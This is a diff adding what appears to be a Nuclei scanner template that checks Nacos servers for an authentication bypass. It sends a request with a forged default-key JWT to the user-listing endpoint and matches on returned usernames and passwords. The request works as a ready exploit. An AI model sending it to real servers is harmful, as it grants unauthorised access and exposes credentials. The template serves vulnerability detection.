@@ -1,0 +1,17 @@
+id: nacos-default-jwt-auth-bypass
+requests:
+  - method: GET
+    path:
+      - "/nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MTc0NTgzNTYwOH0.gk9tFDRWDozKj-fsLAXSxnpojBklSaOVPNbUneqTSpw"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["pageItems", "username", "password"]
+        condition: and
+      - type: regex
+        regex:
+          - '"username"\s*:\s*"[^"]+"'
+          - '"password"\s*:\s*"[^"]+"'
+        condition: and
